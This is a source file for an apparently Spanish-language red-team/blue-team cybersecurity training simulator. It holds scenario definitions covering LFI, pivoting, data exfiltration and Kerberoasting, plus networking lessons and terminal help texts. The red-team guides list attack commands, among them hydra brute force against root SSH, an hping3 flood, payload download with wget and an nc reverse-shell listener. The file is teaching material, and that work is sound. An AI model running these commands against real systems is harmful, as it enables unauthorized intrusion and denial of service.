                    hostname: 'DB-FINANCE-01',
                    os: 'linux',
                    services: { 
                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
                        3306: { name: 'mysql', version: '8.0', state: 'open', vulnerabilities: [] }
                    },
                    users: [{ username: 'root', password: 'DbP@ss2024!', privileges: 'root' }],
                    files: [{ path: '/db/finance_backup.sql', permissions: '600', content: 'CREDIT_CARD_DATA_HERE', hash: 'finance_db_hash' }]
                }],
                firewall: { enabled: true, rules: [] },
                ids: { enabled: false, signatures: [], alerts: [] }
            }
        },
        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
        timeline: []
    },
    objectives: [
        { id: 'red-lfi', description: 'Explotar LFI para leer /etc/passwd en WEB-DMZ-01', points: 15, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Red' && log.message.includes('/etc/passwd')) },
        { id: 'red-rce', description: 'Obtener ejecución remota de código en WEB-DMZ-01', points: 25, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.0.10')},
        { id: 'red-pivot', description: 'Acceder a DB-FINANCE-01 desde el servidor DMZ', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.10.0.50')},
        { id: 'red-exfiltrate', description: 'Exfiltrar el archivo finance_backup.sql', points: 35, required: true, validator: (env) => env.attackProgress.persistence.includes('data_exfiltrated') },
        
        { id: 'blue-detect-lfi', description: 'Detectar el intento de LFI en los logs de Nginx', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Blue' && log.message.includes('grep') && log.message.includes('../../')) },
        { id: 'blue-contain-dmz', description: 'Contener la amenaza en WEB-DMZ-01 (bloquear IP, matar shell)', points: 25, required: true, validator: (env) => env.defenseProgress.blockedIPs.length > 0 },
        { id: 'blue-detect-pivot', description: 'Detectar el intento de pivoteo a la red interna', points: 30, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'Blue' && log.message.includes('tcpdump -i eth1')) },
        { id: 'blue-segment-network', description: 'Bloquear el acceso de la DMZ a la red interna', points: 20, required: true, validator: (env) => env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '10.0.0.10') },
    ],
    hints: [
        { trigger: (env) => env.timeline.some(log => log.message.includes('/etc/passwd')), message: '🚨 [EQUIPO AZUL] Intento de LFI detectado. Investiga los logs de Nginx y el proceso www-data inmediatamente.' },
        { trigger: (env) => env.attackProgress.compromised.includes('10.0.0.10'), message: '💡 [EQUIPO ROJO] Estás dentro. Enumera las interfaces de red. ¿Hay una red interna a la que puedas pivotar?' },
    ],
    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
};

export const adEscalationScenario: InteractiveScenario = {
    id: 'escenario10',
    isInteractive: true,
    icon: 'key',
    color: 'bg-yellow-600',
    title: 'La Escalada del Dominio (Active Directory)',
    subtitle: "Ataque de Kerberoasting y Movimiento Lateral en 'cybervaltorix.local'.",
    description: 'Desde un usuario de bajos privilegios, el Equipo Rojo debe escalar a Administrador de Dominio. El Equipo Azul debe proteger y monitorear Active Directory.',
    difficulty: 'advanced',
    team: 'both',
    initialEnvironment: {
        networks: {
            'corp': {
                hosts: [
                    {
                        ip: '10.10.0.5', hostname: 'DC-01', os: 'windows',
                        services: { 389: { name: 'ldap', version: 'AD', state: 'open', vulnerabilities: [] } },
                        users: [
                            { username: 'Administrator', password: 'AdminP@ssw0rd!2024', privileges: 'root'},
                            { username: 'svc_sql', password: 'SqlP@ssw0rd123', privileges: 'admin' },
                            { username: 'pasante-red', password: 'Password123', privileges: 'user'},
                        ],
                        files: []
                    },
                    {
                        ip: '10.10.0.20', hostname: 'WKSTN-07', os: 'windows',
                        services: { 3389: { name: 'rdp', version: '10.0', state: 'open', vulnerabilities: [] } },
                        users: [{ username: 'pasante-red', password: 'Password123', privileges: 'user' }],
                        files: []
                    }
                ],
                firewall: { enabled: true, rules: [] },
                ids: { enabled: true, signatures: ['KERBEROASTING_RC4'], alerts: [] }
            }
        },
        attackProgress: { reconnaissance: [], compromised: ['10.10.0.20'], credentials: {}, persistence: [] },
        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
        timeline: []
    },
    objectives: [
        { id: 'red-kerberoast', description: "Ejecutar un ataque de Kerberoasting y obtener el hash TGS de 'svc_sql'", points: 30, required: true, validator: (env) => env.attackProgress.credentials['svc_sql_hash'] === '$krb5tgs$23$*...' },
        { id: 'red-crack-hash', description: "Crackear el hash de 'svc_sql' para obtener la contraseña en texto plano", points: 20, required: true, validator: (env) => env.attackProgress.credentials['svc_sql@10.10.0.5'] === 'SqlP@ssw0rd123'},
        { id: 'red-domain-admin', description: 'Comprometer el Domain Controller (DC-01) y obtener privilegios de Domain Admin', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.10.0.5') },
        
        { id: 'blue-detect-kerberoast', description: 'Detectar el ataque de Kerberoasting monitoreando eventos de seguridad (ID 4769)', points: 20, required: true, validator: (env) => env.defenseProgress.patchedVulnerabilities.includes('kerberoast_detected') },
        { id: 'blue-secure-account', description: "Asegurar la cuenta 'svc_sql' (deshabilitar, resetear contraseña fuerte)", points: 20, required: true, validator: (env) => env.defenseProgress.hardenedHosts.includes('svc_sql_secured')},
        { id: 'blue-prevent-lateral', description: 'Prevenir/detectar el movimiento lateral hacia el DC-01', points: 15, required: true, validator: (env) => env.defenseProgress.blockedIPs.includes('10.10.0.20')},
    ],
    hints: [
        { trigger: (env) => env.timeline.filter(log => log.message.includes('kerberoast')).length > 0, message: '🚨 [EQUIPO AZUL] Múltiples solicitudes de tickets de servicio (TGS) para cuentas de servicio detectadas. ¡Posible Kerberoasting en progreso!' },
        { trigger: (env) => !env.attackProgress.credentials['svc_sql@10.10.0.5'], message: '💡 [EQUIPO ROJO] La cuenta svc_sql tiene un SPN. Es un objetivo ideal para Kerberoasting. Usa Rubeus o GetUserSPNs.py.' },
    ],
    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
};


export const TRAINING_SCENARIOS: (TrainingScenario | InteractiveScenario)[] = [
    {
        id: 'escenario1', icon: 'layers', color: 'bg-blue-500', title: 'Escenario 1: El Diagnóstico (OSI/TCP-IP)',
        subtitle: 'Tiempo Estimado: 20 minutos',
        content: <div className="grid md:grid-cols-2 gap-6">
            <CisoCard icon="clipboard-list" title="Situación">
                <p>Reciben dos tickets de soporte simultáneamente:</p>
                <ul>
                    <li><strong>Ticket A:</strong> Un usuario (<code>192.168.1.50</code>) se queja de que <code>http://intranet.cybervaltorix.local</code> (<code>10.10.30.5</code>) carga "extremadamente lento".</li>
                    <li><strong>Ticket B:</strong> Otro usuario (<code>192.168.1.52</code>) reporta que no puede acceder a <code>\\srv-files.cybervaltorix.local</code> (<code>10.10.40.10</code>). Un <code>ping</code> falla con "Destination Host Unreachable".</li>
                </ul>
            </CisoCard>
            <CisoCard icon="target" title="Su Tarea">
                 <p>Son Nivel 1. Aísles el problema desde su máquina Kali (<code>192.168.1.0/24</code>).</p>
                 <h4>Entregables</h4>
                 <ul>
                     <li><strong>Proceso de Diagnóstico:</strong> Pasos y comandos para ambos tickets.</li>
                     <li><strong>Aislamiento de Capa:</strong> ¿Qué capa (TCP/IP) es la sospechosa para el Ticket A? ¿Y para el Ticket B?</li>
                     <li><strong>Herramientas:</strong> ¿Qué comandos (<code>ping</code>, <code>traceroute</code>, etc.) usarían?</li>
                 </ul>
            </CisoCard>
        </div>
    },
     {
        id: 'escenario2', icon: 'shield-alert', color: 'bg-red-500', title: 'Escenario 2: El Vector de Ataque (DNS)',
        subtitle: 'Tiempo Estimado: 20 minutos',
        content: <div className="grid md:grid-cols-2 gap-6">
            <CisoCard icon="clipboard-list" title="Situación">
                <p>Monitoreando logs de firewall. El Resolver DNS interno es <code>172.16.10.5</code>. Una laptop (<code>172.16.20.100</code>) muestra tráfico anómalo:</p>
                <pre><code>... 172.16.20.100:34876 -&gt; 8.8.8.8:53 ... ALLOWED
... 172.16.20.100:34877 -&gt; 1.1.1.1:53 ... ALLOWED
... 172.16.20.100:41982 -&gt; 198.51.100.50:53 ... ALLOWED</code></pre>
                <p><code>198.51.100.50</code> es un resolver desconocido en Rusia. El tráfico es constante y las consultas parecen sin sentido (ej. <code>aHR0...com</code>).</p>
            </CisoCard>
            <CisoCard icon="target" title="Su Tarea">
                <ol>
                    <li>Analizar y explicar el evento.</li>
                    <li>Proponer contención inmediata (firewall).</li>
                </ol>
                <h4>Entregables</h4>
                <ul>
                    <li><strong>Análisis de Amenaza:</strong> ¿Riesgo? ¿Por qué es malo usar <code>8.8.8.8</code>? ¿Qué es el tráfico a <code>198.51.100.50</code>?</li>
                    <li><strong>Política de Contención:</strong> Escriba la política de firewall de egreso (Origen, Destino, Puerto) para neutralizar y prevenir esto.</li>
                    <li><strong>Simulación (Opcional):</strong> ¿Qué comando de Kali usaría para simular esta consulta anómala?</li>
                </ul>
            </CisoCard>
        </div>
    },
    {
        id: 'escenario3', icon: 'network', color: 'bg-green-500', title: 'Escenario 3: La Segmentación (Subnetting y ACLs)',
        subtitle: 'Tiempo Estimado: 20 minutos',
        content: <div className="grid md:grid-cols-2 gap-6">
            <CisoCard icon="clipboard-list" title="Situación">
                <p>Implementando política "Zero Trust" en el firewall que segmenta las subredes VLSM.</p>
                <h5>Las Zonas de Red:</h5>
                <ul>
                    <li><strong>Zona 1 (Invitados):</strong> <code>192.168.10.0/24</code></li>
                    <li><strong>Zona 2 (Corporativa):</strong> <code>192.168.20.0/25</code></li>
                    <li><strong>Zona 3 (Desarrollo):</strong> <code>192.168.20.128/26</code></li>
                    <li><strong>Zona 4 (Servidores):</strong> <code>192.168.30.0/27</code>
                        <ul className="ml-6 mt-1 text-sm">
                            <li><code>192.168.30.10</code> = Servidor Archivos (SMB, 445/TCP)</li>
                            <li><code>192.168.30.15</code> = Servidor BD (SQL, 1433/TCP)</li>
                        </ul>
                    </li>
                </ul>
            </CisoCard>
            <CisoCard icon="target" title="Su Tarea">
                <p>Definir la matriz de reglas de firewall (ACLs) que controla el tráfico <strong>entre</strong> estas zonas.</p>
                <h4>Entregables</h4>
                <ul>
                    <li><strong>Principio Rector:</strong> ¿Cuál es la <strong>primera</strong> regla que debe existir en cualquier política de firewall entre zonas?</li>
                    <li><strong>Matriz de ACLs:</strong> Defina qué tráfico está permitido/denegado. (Ej. ¿Zona 2 a Zona 4? ¿Zona 1 a cualquier otra?).</li>
                    <li><strong>Prueba de Verificación (Kali):</strong> ¿Qué comando usaría desde Zona 1 para <strong>probar</strong> que su bloqueo a Zona 4 es efectivo?</li>
                </ul>
            </CisoCard>
        </div>
    },
    {
        id: 'escenario4', icon: 'brain-circuit', color: 'bg-yellow-500', title: 'Escenario 4: Análisis de DNS, VLSM e Incidentes (Taller 2)',
        subtitle: 'Tiempo Estimado: 45 minutos',
        content: <>
            <CisoCard icon="book-copy" title="Sección 1: Fundamentos Operativos de DNS">
                <p>Responda las siguientes preguntas basándose en el material de recursos.</p>
                <ol>
                    <li><strong>El Gerente de Marketing:</strong> Un gerente le pregunta: "¿Qué es el DNS y por qué Tl habla tanto de él?" Explíquelo en términos sencillos, enfocándose en por qué es crítico para el negocio.</li>
                    <li><strong>El Arquitecto de Redes:</strong> Un arquitecto pregunta: "¿Por qué necesito abrir tanto UDP como TCP en el puerto 53? ¿No era DNS solo UDP?" Justifique la necesidad de ambos.</li>
                    <li><strong>Análisis de Proceso:</strong> Describa la diferencia fundamental entre una consulta DNS recursiva y una iterativa. ¿Cuál inicia su laptop y cuál realiza nuestro resolver interno?</li>
                </ol>
            </CisoCard>
            <CisoCard icon="shield-half" title="Sección 2: Escenarios de Ataque DNS">
                <ol start={4}>
                    <li><strong>Escenario (Pharming):</strong> Varios usuarios reportan que al escribir <code>www.nuestro-banco-asociado.com</code>, llegan a un sitio clonado que pide "verificar" su información. ¿Cuál es el ataque más probable? ¿El problema está en la laptop o en un servidor?</li>
                    <li><strong>Escenario (DDoS):</strong> El NOC reporta que nuestro servidor web está saturado por un volumen masivo de <strong>respuestas</strong> DNS anormalmente grandes. ¿Qué tipo de ataque DDoS es este? ¿Por qué el atacante usaría servidores de terceros?</li>
                    <li><strong>Mitigación Estratégica:</strong> El material menciona una tecnología con firmas criptográficas para proteger la integridad de las respuestas DNS. ¿Cómo se llama? ¿Cómo habría prevenido el ataque del Escenario 4?</li>
                </ol>
            </CisoCard>
        </>
    },
    {
        id: 'escenario5', icon: 'shield-off', color: 'bg-red-700', title: 'Escenario 5: "El Peor Día" (Recuperación de Control)',
        subtitle: 'Equipo Azul - Respuesta a Incidentes',
        content: <>
            <CisoCard icon="alert-octagon" title='Situación: 10. "El Peor Día"'>
                <p>Es lunes, 9:00 AM. Clientes reportan que nuestro sitio (<code>www.esit-pasantes.com</code>) es una página de phishing pidiendo tarjetas de crédito. TI confirma que no pueden iniciar sesión en <code>WEB-PROD-01</code>; sus contraseñas de admin y root han sido cambiadas. Han perdido el control.</p>
            </CisoCard>
            <CisoCard icon="shield" title="FASE A: CONTENCIÓN (Detener el fraude AHORA)">
                <p><strong>Menú de Herramientas/Acciones:</strong></p>
                <ol>
                    <li><strong>Firewall de Red (ACLs):</strong> Bloquear la IP del servidor <code>WEB-PROD-01</code>.</li>
                    <li><strong>Consola del Hipervisor (vSphere/Hyper-V):</strong> "Desconectar" la tarjeta de red virtual (vNIC) del servidor.</li>
                    <li><strong>Registrador de DNS Público:</strong> Cambiar el registro DNS <code>www.esit-pasantes.com</code> para que apunte a una IP de "página en mantenimiento".</li>
                    <li><strong>Desconectar el Servidor:</strong> Ir al data center y desconectar el cable físico.</li>
                </ol>
                 <h4>Su Tarea (A):</h4>
                 <p>Priorice las acciones del menú. ¿Cuál es la acción MÁS RÁPIDA y EFECTIVA para detener el fraude al cliente? ¿Por qué las otras opciones son peores o más lentas?</p>
            </CisoCard>
        </>
    },
    {
        id: 'escenario6', icon: 'swords', color: 'bg-purple-500', title: 'Escenario 6: "El Cazador" (Simulación de Equipo Rojo)',
        subtitle: 'Equipo Rojo - Pentesting',
        content: <>
             <CisoCard icon="user-check" title="Equipo y Misión">
                <p><strong>Equipo:</strong> Esta tarea es para el equipo de pentesting (Equipo Rojo). El Equipo Azul (resto de pasantes) estará en modo defensivo.</p>
                <p><strong>Misión:</strong> Su trabajo es causar el incidente del Escenario 5. Comprometer <code>WEB-PROD-01</code> (en sandbox), bloquear a los administradores y suplantar el sitio web.</p>
            </CisoCard>
             <CisoCard icon="binoculars" title="FASE 1: RECONOCIMIENTO Y ACCESO INICIAL">
                <p><strong>Objetivo:</strong> Encontrar una forma de entrar (ej. phishing a un admin).</p>
                <h4>Su Tarea (Fase 1):</h4>
                <p>Describan cómo identificarían a su objetivo y qué método de "Acceso Inicial" elegirían.</p>
            </CisoCard>
        </>
    },
    fortressScenario,
    rageScenario,
    killChainScenario,
    adEscalationScenario,
];

// FIX: Add missing RESOURCE_MODULES export
export const RESOURCE_MODULES: ResourceModule[] = [
    {
        id: 'fundamentos-red',
        icon: 'book-open',
        title: 'Fundamentos de Redes (Modelos OSI y TCP/IP)',
        content: (
            <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
                <CisoCard title="El Modelo OSI: La Teoría">
                    <p>El modelo OSI (Open Systems Interconnection) es un marco conceptual de 7 capas que estandariza las funciones de un sistema de telecomunicaciones o de computación sin tener en cuenta su estructura interna y tecnología subyacentes. Es una guía, no una implementación estricta.</p>
                    <ol>
                        <li><b>Capa Física:</b> Transmisión de bits. Cables, conectores, voltajes.</li>
                        <li><b>Capa de Enlace de Datos:</b> Direccionamiento físico (MAC). Tramas (Frames).</li>
                        <li><b>Capa de Red:</b> Direccionamiento lógico (IP) y enrutamiento. Paquetes.</li>
                        <li><b>Capa de Transporte:</b> Conexión extremo a extremo, fiabilidad (TCP) y velocidad (UDP). Segmentos/Datagramas.</li>
                        <li><b>Capa de Sesión:</b> Gestión de diálogos entre aplicaciones.</li>
                        <li><b>Capa de Presentación:</b> Formato de datos, cifrado, compresión.</li>
                        <li><b>Capa de Aplicación:</b> Protocolos de alto nivel (HTTP, FTP, SMTP).</li>
                    </ol>
                </CisoCard>
                <CisoCard title="El Modelo TCP/IP: La Práctica">
                    <p>El modelo TCP/IP es un modelo más práctico y condensado de 4 capas que es la base de Internet. Se enfoca en la implementación.</p>
                     <ol>
                        <li><b>Acceso a Red (Capas 1 y 2 de OSI):</b> Combina las capas Física y de Enlace. Se encarga de cómo los datos se envían físicamente a través de la red.</li>
                        <li><b>Internet (Capa 3 de OSI):</b> Equivalente a la Capa de Red. Direccionamiento IP y enrutamiento de paquetes.</li>
                        <li><b>Transporte (Capa 4 de OSI):</b> Equivalente a la Capa de Transporte. Protocolos TCP y UDP.</li>
                        <li><b>Aplicación (Capas 5, 6 y 7 de OSI):</b> Combina Sesión, Presentación y Aplicación. Protocolos como HTTP, DNS, FTP.</li>
                    </ol>
                </CisoCard>
            </div>
        )
    },
    {
        id: 'dns-profundo',
        icon: 'book-search',
        title: 'Guía Profunda de DNS',
        content: (
             <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
                <CisoCard title="¿Qué es DNS?">
                    <p>El Sistema de Nombres de Dominio (DNS) es el servicio de directorio de Internet. Los humanos acceden a la información en línea a través de nombres de dominio, como <code>cybervaltorix.com</code>. Los navegadores web interactúan a través de direcciones de Protocolo de Internet (IP). DNS traduce los nombres de dominio a direcciones IP para que los navegadores puedan cargar los recursos de Internet.</p>
                </CisoCard>
                 <CisoCard title="Tipos de Consultas DNS">
                    <ul>
                        <li><b>Consulta Recursiva:</b> Un cliente DNS (como tu PC) le pide a un servidor DNS (el "resolver") que realice la resolución de nombres completa por él. El resolver hace todo el trabajo y devuelve la respuesta final o un error.</li>
                        <li><b>Consulta Iterativa:</b> El cliente DNS le pregunta a un servidor, y si este no tiene la respuesta, le devuelve una referencia a otro servidor DNS "más autoritativo" al que preguntar. El cliente debe entonces repetir la consulta a ese nuevo servidor. Este proceso continúa hasta que se encuentra un servidor autoritativo que puede dar la respuesta final.</li>
                    </ul>
                </CisoCard>
                 <CisoCard title="DNS y Seguridad (Vectores de Ataque)">
                    <ul>
                        <li><b>Envenenamiento de Caché / Spoofing:</b> Un atacante introduce datos DNS falsos en la caché de un resolver, haciendo que los usuarios sean redirigidos a sitios maliciosos.</li>
                        <li><b>DNS Tunneling:</b> Usar DNS para exfiltrar datos o para establecer un canal de Comando y Control (C2). Las consultas DNS se disfrazan para llevar cargas útiles maliciosas.</li>
                        <li><b>Ataques de Amplificación DNS:</b> Un tipo de DDoS donde un atacante envía pequeñas consultas DNS a servidores públicos con una dirección IP de origen falsificada (la de la víctima). Los servidores responden con respuestas mucho más grandes a la víctima, abrumando sus recursos.</li>
                        <li><b>DNSSEC (Domain Name System Security Extensions):</b> Mitiga el envenenamiento de caché al agregar firmas criptográficas a los registros DNS para verificar su autenticidad.</li>
                    </ul>
                </CisoCard>
            </div>
        )
    },
    {
        id: 'subnetting-vlsm',
        icon: 'network',
        title: 'Subnetting y VLSM',
        content: (
            <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
                <CisoCard title="Subnetting: Dividir para Vencer">
                    <p>Subnetting es el proceso de tomar una red grande y dividirla en múltiples redes más pequeñas o subredes. Esto se hace para mejorar la seguridad, la organización y el rendimiento de la red, y para conservar las direcciones IP.</p>
                    <p>La <b>Máscara de Subred</b> (ej. <code>255.255.255.0</code> o <code>/24</code>) es lo que define qué parte de una dirección IP pertenece a la red (NetID) y qué parte al dispositivo (HostID).</p>
                </CisoCard>
                 <CisoCard title="VLSM: Máscara de Subred de Longitud Variable">
                    <p>VLSM es una técnica más eficiente de subnetting. En lugar de dividir una red en subredes del mismo tamaño, VLSM permite crear subredes de diferentes tamaños a partir de la misma red base. Esto es extremadamente útil para minimizar el desperdicio de direcciones IP.</p>
                    <p><b>Ejemplo Práctico:</b> Tienes el bloque <code>192.168.0.0/24</code> (254 hosts). Necesitas:</p>
                    <ul>
                        <li>Una red para 100 PCs.</li>
                        <li>Una red para 50 PCs.</li>
                        <li>Una red para 10 servidores.</li>
                        <li>Enlaces punto a punto de 2 IPs cada uno.</li>
                    </ul>
                    <p>Con subnetting tradicional, podrías crear 4 subredes de 62 hosts cada una (<code>/26</code>), desperdiciando muchas IPs. Con VLSM, puedes crear subredes de tamaño preciso (<code>/25</code> para 126 hosts, <code>/26</code> para 62 hosts, <code>/28</code> para 14 hosts, <code>/30</code> para 2 hosts), optimizando el uso del espacio de direccionamiento.</p>
                </CisoCard>
            </div>
        )
    },
];

// Terminal Help Text
export const GENERAL_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">Bienvenido a la terminal de simulación.
Use 'help' para comandos de equipo, o 'help [id_escenario]' para guías.
Ej: <strong class="text-amber-300">help escenario7</strong>

  clear                    - Limpia la pantalla de la terminal.
  marca                    - Muestra la marca de Cyber Valtorix.
  exit                     - Cierra una sesión SSH simulada.
</pre>`;

export const RED_TEAM_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-red-400">EQUIPO ROJO - OBJETIVOS Y COMANDOS</strong>
Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (ej. help escenario8).

<strong>Fase 1: Reconocimiento</strong>
  <strong class="text-amber-300">nmap [opciones] [host]</strong>    - Escanea puertos y servicios.
  <strong class="text-amber-300">dirb http://[host]</strong>       - Busca directorios web ocultos.
  <strong class="text-amber-300">curl http://[host]/[file]</strong> - Intenta leer archivos sensibles.
  <strong class="text-amber-300">nikto -h http://[host]</strong>   - Escáner de vulnerabilidades web.
  <strong class="text-amber-300">ping [host]</strong>              - Verifica conectividad.

<strong>Fase 2: Intrusión y Explotación</strong>
  <strong class="text-amber-300">hydra -l [user] -P [file] ssh://[host]</strong> - Lanza ataque de fuerza bruta. <strong class="text-red-500">(¡RUIDOSO!)</strong>
  <strong class="text-amber-300">hping3 --flood -S [host]</strong> - Lanza un ataque de denegación de servicio (DoS).
  <strong class="text-amber-300">john [hash_file]</strong>       - Simula cracking de contraseñas offline.
  <strong class="text-amber-300">ssh [user]@[host]</strong>      - Intenta acceder con credenciales encontradas.
  <strong class="text-amber-300">wget [url]</strong>             - (Dentro del host) Descarga un 'payload'.
  <strong class="text-amber-300">nc -lvnp [port]</strong>        - Crea un listener para reverse shells.

<strong>Fase 3: Post-Explotación</strong>
  <strong class="text-amber-300">ls -la</strong>                 - Lista archivos y permisos.
  <strong class="text-amber-300">cat [file]</strong>               - Muestra contenido de un archivo.
  <strong class="text-amber-300">ps aux</strong>                 - Muestra procesos en ejecución.
  <strong class="text-amber-300">whoami</strong>                 - Muestra el usuario actual.
</pre>`;

export const BLUE_TEAM_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-blue-400">EQUIPO AZUL - OBJETIVOS Y COMANDOS</strong>
Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (ej. help escenario8).

<strong>Fase 1: Conexión y Hardening</strong>
  <strong class="text-amber-300">ssh blue-team@[host]</strong>     - Conéctese al servidor para asegurarlo.
  <strong class="text-amber-300">sudo ufw [cmd]</strong>           - Gestiona el firewall (status, enable, allow, deny).
  <strong class="text-amber-300">sudo nano [file]</strong>         - Simula editar un archivo de configuración.
  <strong class="text-amber-300">sudo systemctl restart [svc]</strong>- Aplica los cambios a un servicio (ej. sshd).
  <strong class="text-amber-300">ls -l [file]</strong>             - Lista permisos de archivos.
  <strong class="text-amber-300">sudo chmod [perm] [file]</strong>   - Cambia permisos de archivos.

<strong>Fase 2: Monitoreo y Detección</strong>
  <strong class="text-amber-300">top</strong> / <strong class="text-amber-300">htop</strong>               - Muestra la carga del sistema (Detectar DoS).
  <strong class="text-amber-300">sudo ss -tulnp</strong>               - Muestra servicios escuchando en puertos.
  <strong class="text-amber-300">grep "Failed" /var/log/auth.log</strong> - Busca intentos de login fallidos.
  <strong class="text-amber-300">journalctl -u sshd</strong>       - Revisa logs del servicio SSH.
  <strong class="text-amber-300">openssl s_client -connect [host]:443</strong> - Valida el certificado SSL/TLS.

<strong>Fase 3: Respuesta a Incidentes</strong>
  <strong class="text-amber-300">fail2ban-client banip [ip]</strong> - Simula un baneo manual de IP.
  <strong class="text-amber-300">sha256sum [file]</strong>           - Verifica la integridad de un archivo.
</pre>`;

export const SCENARIO_HELP_TEXTS: { [key: string]: { general: string, red: string, blue: string } } = {
  'escenario7': {
    general: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 7: Fortaleza Digital</strong>
Este es un ejercicio práctico de ataque y defensa en tiempo real contra <strong class="text-cyan-300">BOVEDA-WEB</strong>.
</pre>`,
    blue: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - EN TERMINAL 'BOVEDA-WEB'</strong>
Tu misión es asegurar el servidor ANTES de que el Equipo Rojo encuentre una vulnerabilidad.
El orden es crítico.

1.  <strong>Activar Firewall (UFW):</strong> Es tu primera línea de defensa.
    <strong class="text-amber-300">sudo ufw status</strong>      (Verifica que está inactivo)
    <strong class="text-amber-300">sudo ufw allow ssh</strong>     (¡CRÍTICO! O te quedarás fuera)
    <strong class="text-amber-300">sudo ufw allow http</strong>      (Permite el tráfico web)
    <strong class="text-amber-300">sudo ufw enable</strong>        (¡Actívalo!)

2.  <strong>Asegurar SSH:</strong> Deshabilita el login directo de 'root'.
    <strong class="text-amber-300">sudo nano /etc/ssh/sshd_config</strong>  (Simula la edición, cambiarás PermitRootLogin a 'no')
    <strong class="text-amber-300">sudo systemctl restart sshd</strong> (Aplica los cambios)

3.  <strong>Principio de Menor Privilegio:</strong> Protege archivos sensibles.
    <strong class="text-amber-300">ls -l /var/www/html/db_config.php</strong> (Verás permisos peligrosos como 644)
    <strong class="text-amber-300">sudo chmod 640 /var/www/html/db_config.php</strong>  (Quita permisos de lectura a 'otros')

4.  <strong>Monitoreo Activo:</strong> Caza al Equipo Rojo.
    <strong class="text-amber-300">grep "Failed" /var/log/auth.log</strong> (Ejecuta esto repetidamente mientras el Equipo Rojo
                           usa 'hydra' para ver los ataques en tiempo real)
    <strong class="text-amber-300">sudo ss -tulnp</strong>       (Verifica qué puertos están abiertos. Deberían ser
                           menos después de activar el firewall)
</pre>`,
    red: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
Tu misión es encontrar una ventana de oportunidad antes de que el Equipo Azul la cierre.

1.  <strong>Reconocimiento:</strong> ¿Qué está abierto?
    <strong class="text-amber-300">nmap -sV -sC BOVEDA-WEB</strong> (Si el firewall está apagado, verás muchos
                           puertos. Si está encendido, solo los permitidos)

2.  <strong>Intento de Fuerza Bruta:</strong> El ataque más ruidoso.
    <strong class="text-amber-300">hydra -l root -P rockyou.txt ssh://BOVEDA-WEB</strong> (Esto SOLO FUNCIONARÁ si el Equipo Azul no ha
                           asegurado SSH para deshabilitar el login de root)
                           Si tienes éxito, entra con <strong class="text-amber-300">ssh root@BOVEDA-WEB</strong>

3.  <strong>Explotación Web (Simulada):</strong>
    <strong class="text-amber-300">dirb http://BOVEDA-WEB</strong>     (Busca directorios. ¿Hay un /backup?)
    <strong class="text-amber-300">curl http://BOVEDA-WEB/db_config.php</strong> (Si los permisos no han sido
                                     corregidos, podrías leer el archivo)
</pre>`
  },
 'escenario8': {
    general: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 8: Furia en la Red</strong>
Ataque combinado contra <strong class="text-cyan-300">PORTAL-WEB</strong>. El trabajo en equipo y la velocidad son claves.
</pre>`,
    blue: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - EN TERMINAL 'PORTAL-WEB'</strong>
Estás bajo un doble ataque. Debes diagnosticar y mitigar ambas amenazas.

1.  <strong>Diagnóstico Inicial:</strong> ¿Qué está pasando?
    <strong class="text-amber-300">top</strong>                 (El sistema está lento. Verás una carga de CPU del 99%.
                          Esto indica un posible DoS o un proceso descontrolado).
    <strong class="text-amber-300">journalctl -u sshd</strong>    (Verás cientos de "Failed password for admin".
                          Esto es un ataque de fuerza bruta. Anota la IP de origen).

2.  <strong>Mitigación Inmediata:</strong> ¡Detén el sangrado!
    <strong class="text-amber-300">sudo ufw deny from [IP_ATACANTE]</strong> (Bloquea la IP que encontraste en los
                                      logs. Esto detendrá AMBOS ataques).
    <strong class="text-amber-300">fail2ban-client set sshd banip [IP_ATACANTE]</strong> (Alternativa que simula
                                                    un baneo automático).
    Vuelve a ejecutar <strong class="text-amber-300">top</strong>. La carga debería normalizarse.

3.  <strong>Análisis Post-Incidente:</strong> ¿Lograron entrar?
    <strong class="text-amber-300">sha256sum /var/www/html/index.php</strong> (Verifica la integridad del archivo.
                                        Si el Equipo Rojo tuvo éxito, verás una alerta
                                        de que el hash no coincide).
</pre>`,
